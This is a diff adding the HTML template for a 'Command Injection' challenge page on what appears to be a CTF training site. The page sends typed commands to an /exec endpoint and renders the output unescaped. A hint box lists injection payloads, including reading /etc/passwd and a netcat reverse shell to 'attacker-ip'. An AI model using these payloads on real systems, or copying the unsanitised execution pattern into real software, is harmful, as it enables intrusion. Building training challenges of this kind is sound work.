@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Command Injection - Kiboswa CTF</title>
+<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<style>
+    .cmd-container {
+        max-width: 900px;
+        margin: 40px auto;
+        padding: 0 20px;
+    }
+    
+    .cmd-card {
+        background: rgba(255,255,255,0.1);
+        backdrop-filter: blur(10px);
+        border-radius: 20px;
+        padding: 30px;
+    }
+    
+    .terminal {
+        background: #000;
+        border-radius: 10px;
+        padding: 20px;
+        margin: 20px 0;
+        font-family: monospace;
+    }
+    
+    .terminal-header {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 15px;
+        padding-bottom: 10px;
+        border-bottom: 1px solid #333;
+    }
+    
+    .terminal-dot {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+    }
+    
+    .terminal-dot.red { background: #ff5f56; }
+    .terminal-dot.yellow { background: #ffbd2e; }
+    .terminal-dot.green { background: #27c93f; }
+    
+    .terminal-output {
+        color: #0f0;
+        white-space: pre-wrap;
+        font-family: monospace;
+    }
+    
+    .cmd-input {
+        display: flex;
+        gap: 10px;
+        margin: 20px 0;
+    }
+    
+    .cmd-input input {
+        flex: 1;
+        padding: 12px;
+        background: #000;
+        border: 1px solid #0f0;
+        color: #0f0;
+        font-family: monospace;
+        border-radius: 5px;
+    }
+    
+    .cmd-input button {
+        padding: 12px 25px;
+        background: #0f0;
+        color: #000;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-weight: bold;
+    }
+</style>
+</head>
+<body>
+
+<section class="header">
+    <h1>KIBOSWA CTF</h1>
+    <nav>
+        <ul>
+            <li><a href="/">Home</a></li>
+            <li><a href="/dashboard">Dashboard</a></li>
+            <li><a href="/challenges">Challenges</a></li>
+            <li><a href="/logout">Logout</a></li>
+        </ul>
+    </nav>
+</section>
+
+<div class="cmd-container">
+    <div class="cmd-card">
+        <div style="text-align: center;">
+            <i class="fas fa-terminal" style="font-size: 48px; color: #00d4b0;"></i>
+            <h1>Command Injection</h1>
+            <span class="challenge-difficulty">Medium</span>
+            <span class="challenge-points">150 pts</span>
+        </div>
+        
+        <div class="terminal">
+            <div class="terminal-header">
+                <div class="terminal-dot red"></div>
+                <div class="terminal-dot yellow"></div>
+                <div class="terminal-dot green"></div>
+                <span style="margin-left: 10px; color: #888;">user@kiboswa:~</span>
+            </div>
+            <div class="terminal-output" id="terminalOutput">
+                $ Welcome to the command executor
+                $ Try: ; ls -la
+            </div>
+        </div>
+        
+        <div class="cmd-input">
+            <input type="text" id="cmdInput" placeholder="Enter command... (e.g., whoami, ls -la)" onkeypress="handleKeyPress(event)">
+            <button onclick="executeCommand()">
+                <i class="fas fa-play"></i> Execute
+            </button>
+        </div>
+        
+        <div class="hint" style="background: rgba(255,193,7,0.1); padding: 15px; border-radius: 8px; margin-top: 20px;">
+            <p><i class="fas fa-lightbulb"></i> <strong>Command Injection Payloads:</strong></p>
+            <p><code>; ls -la</code> - List files after ping</p>
+            <p><code>| cat /etc/passwd</code> - Read password file</p>
+            <p><code>; nc -e /bin/sh attacker-ip 4444</code> - Reverse shell</p>
+            <p><code>; python3 -c 'import os; os.system("whoami")'</code> - Python execution</p>
+        </div>
+        
+        <a href="/challenges" class="back-link"><i class="fas fa-arrow-left"></i> Back to Challenges</a>
+    </div>
+</div>
+
+<script>
+    function executeCommand() {
+        const cmd = document.getElementById('cmdInput').value;
+        const outputDiv = document.getElementById('terminalOutput');
+        
+        outputDiv.innerHTML = `$ Executing: ${cmd}<br>Loading...`;
+        
+        fetch(`/exec?cmd=${encodeURIComponent(cmd)}`)
+            .then(response => response.text())
+            .then(data => {
+                outputDiv.innerHTML = `$ ${cmd}<br><br>${data}`;
+            });
+    }
+    
+    function handleKeyPress(event) {
+        if (event.key === 'Enter') {
+            executeCommand();
+        }
+    }
+</script>
+
+</body>
+</html>
